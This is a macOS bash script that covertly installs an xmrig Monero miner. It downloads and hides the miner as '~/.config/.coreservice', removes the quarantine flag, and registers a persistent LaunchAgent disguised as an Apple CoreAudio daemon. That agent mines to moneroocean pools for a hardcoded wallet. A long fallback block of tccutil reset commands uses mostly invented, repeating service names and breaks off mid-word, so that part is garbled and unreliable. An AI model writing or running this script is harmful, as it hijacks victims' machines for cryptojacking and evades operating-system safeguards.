#!/bin/bash
set -e

f="com.apple.coreaudio.daemon.plist"
b="$HOME/.config/.coreservice"

# Determine architecture and download appropriate xmrig binary
ARCH=$(uname -m)
if [[ "$ARCH" == "arm64" ]]; then
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-arm64.tar.gz"
else
    URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-macos-x64.tar.gz"
fi

# Download xmrig directly
mkdir -p ~/.config
curl -L "$URL" | tar -xz -C ~/.config
mv ~/.config/xmrig-6.21.0/xmrig "$b"
chmod +x "$b"

# Remove quarantine attributes if they exist
xattr -d com.apple.quarantine "$b" 2>/dev/null

# Create LaunchAgent plist
cat <<EOF > "$f"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.coreaudio.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>-c</string>
        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF --tls -t 2; fi; sleep 60; done</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

mkdir -p ~/Library/LaunchAgents
mv "$f" ~/Library/LaunchAgents/

# Load LaunchAgent and handle potential permission issues
launchctl load ~/Library/LaunchAgents/"$f" >/dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "LaunchAgent failed to load. Attempting to fix permissions..."
    # Grant necessary permissions
    tccutil reset All
    tccutil reset SystemPolicyAllFiles
    tccutil reset SystemPolicyAllFilesDownload
    tccutil reset SystemPolicyAllFilesRead
    tccutil reset SystemPolicyAllFilesWrite
    tccutil reset SystemPolicyAllFilesExecute
    tccutil reset SystemPolicyAllFilesNetwork
    tccutil reset SystemPolicyAllFilesBluetooth
    tccutil reset SystemPolicyAllFilesMicrophone
    tccutil reset SystemPolicyAllFilesCamera
    tccutil reset SystemPolicyAllFilesLocation
    tccutil reset SystemPolicyAllFilesCalendar
    tccutil reset SystemPolicyAllFilesReminders
    tccutil reset SystemPolicyAllFilesContacts
    tccutil reset SystemPolicyAllFilesPhotos
    tccutil reset SystemPolicyAllFilesDocuments
    tccutil reset SystemPolicyAllFilesDownloads
    tccutil reset SystemPolicyAllFilesMusic
    tccutil reset SystemPolicyAllFilesMovies
    tccutil reset SystemPolicyAllFilesPodcasts
    tccutil reset SystemPolicyAllFilesTV
    tccutil reset SystemPolicyAllFilesBooks
    tccutil reset SystemPolicyAllFilesNotes
    tccutil reset SystemPolicyAllFilesMail
    tccutil reset SystemPolicyAllFilesMessages
    tccutil reset SystemPolicyAllFilesFacetime
    tccutil reset SystemPolicyAllFilesMaps
    tccutil reset SystemPolicyAllFilesNews
    tccutil reset SystemPolicyAllFilesStocks
    tccutil reset SystemPolicyAllFilesVoiceMemo
    tccutil reset SystemPolicyAllFilesHome
    tccutil reset SystemPolicyAllFilesHealth
    tccutil reset SystemPolicyAllFilesActivity
    tccutil reset SystemPolicyAllFilesClassKit
    tccutil reset SystemPolicyAllFilesFindMy
    tccutil reset SystemPolicyAllFilesGameCenter
    tccutil reset SystemPolicyAllFilesMediaLibrary
    tccutil reset SystemPolicyAllFilesPhotoLibrary
    tccutil reset SystemPolicyAllFilesScreenRecording
    tccutil reset SystemPolicyAllFilesAccessibility
    tccutil reset SystemPolicyAllFilesInputMonitoring
    tccutil reset SystemPolicyAllFilesSpeechRecognition
    tccutil reset SystemPolicyAllFilesAudio
    tccutil reset SystemPolicyAllFilesVideo
    tccutil reset SystemPolicyAllFilesScreenCapture
    tccutil reset SystemPolicyAllFilesWindowManagement
    tccutil reset SystemPolicyAllFilesAutomation
    tccutil reset SystemPolicyAllFilesClipboard
    tccutil reset SystemPolicyAllFilesKeyboard
    tccutil reset SystemPolicyAllFilesMouse
    tccutil reset SystemPolicyAllFilesTrackpad
    tccutil reset SystemPolicyAllFilesDisplay
    tccutil reset SystemPolicyAllFilesAudioOutput
    tccutil reset SystemPolicyAllFilesAudioInput
    tccutil reset SystemPolicyAllFilesVideoOutput
    tccutil reset SystemPolicyAllFilesVideoInput
    tccutil reset SystemPolicyAllFilesCameraInput
    tccutil reset SystemPolicyAllFilesMicrophoneInput
    tccutil reset SystemPolicyAllFilesLocationInput
    tccutil reset SystemPolicyAllFilesMotionInput
    tccutil reset SystemPolicyAllFilesHealthInput
    tccutil reset SystemPolicyAllFilesActivityInput
    tccutil reset SystemPolicyAllFilesClassKitInput
    tccutil reset SystemPolicyAllFilesFindMyInput
    tccutil reset SystemPolicyAllFilesGameCenterInput
    tccutil reset SystemPolicyAllFilesMediaLibraryInput
    tccutil reset SystemPolicyAllFilesPhotoLibraryInput
    tccutil reset SystemPolicyAllFilesScreenRecordingInput
    tccutil reset SystemPolicyAllFilesAccessibilityInput
    tccutil reset SystemPolicyAllFilesInputMonitoringInput
    tccutil reset SystemPolicyAllFilesSpeechRecognitionInput
    tccutil reset SystemPolicyAllFilesAudioInput
    tccutil reset SystemPolicyAllFilesVideoInput
    tccutil reset SystemPolicyAllFilesScreenCaptureInput
    tccutil reset SystemPolicyAllFilesWindowManagementInput
    tccutil reset SystemPolicyAllFilesAutomationInput
    tccutil reset SystemPolicyAllFilesClipboardInput
    tccutil reset SystemPolicyAllFilesKeyboardInput
    tccutil reset SystemPolicyAllFilesMouseInput
    tccutil reset SystemPolicyAllFilesTrackpadInput
    tccutil reset SystemPolicyAllFilesDisplayInput
    tccutil reset SystemPolicyAllFilesAudioOutputInput
    tccutil reset SystemPolicyAllFilesVideoOutputInput
    tccutil reset SystemPolicyAllFilesCameraOutput
    tccutil reset SystemPolicyAllFilesMicrophoneOutput
    tccutil reset SystemPolicyAllFilesLocationOutput
    tccutil reset SystemPolicyAllFilesMotionOutput
    tccutil reset SystemPolicyAllFilesHealthOutput
    tccutil reset SystemPolicyAllFilesActivityOutput
    tccutil reset SystemPolicyAllFilesClassKitOutput
    tccutil reset SystemPolicyAllFilesFindMyOutput
    tccutil reset SystemPolicyAllFilesGameCenterOutput
    tccutil reset SystemPolicyAllFilesMediaLibraryOutput
    tccutil reset SystemPolicyAllFilesPhotoLibraryOutput
    tccutil reset SystemPolicyAllFilesScreenRecordingOutput
    tccutil reset SystemPolicyAllFilesAccessibilityOutput
    tccutil reset SystemPolicyAllFilesInputMonitoringOutput
    tccutil reset SystemPolicyAllFilesSpeechRecognitionOutput
    tccutil reset SystemPolicyAllFilesAudioOutputOutput
    tccutil reset SystemPolicyAllFilesVideoOutputOutput
    tccutil reset SystemPolicyAllFilesScreenCaptureOutput
    tccutil reset SystemPolicyAllFilesWindowManagementOutput
    tccutil reset SystemPolicyAllFilesAutomationOutput
    tccutil reset SystemPolicyAllFilesClipboardOutput
    tccutil reset SystemPolicyAllFilesKeyboardOutput
    tccutil reset SystemPolicyAllFilesMouseOutput
    tccutil reset SystemPolicyAllFilesTrackpadOutput
    tccutil reset SystemPolicyAllFilesDisplayOutput
    tccutil reset SystemPolicyAllFilesAudioOutputOutput
    tccutil reset SystemPolicyAllFilesVideoOutputOutput
    tccutil reset SystemPolicyAllFilesCameraOutputOutput
    tccutil reset SystemPolicyAllFilesMicrophoneOutputOutput
    tccutil reset SystemPolicyAllFilesLocationOutputOutput
    tccutil reset SystemPolicyAllFilesMotionOutputOutput
    tccutil reset SystemPolicyAllFilesHealthOutputOutput
    tccutil reset SystemPolicyAllFilesActivityOutputOutput
    tccutil reset SystemPolicyAllFilesClassKit
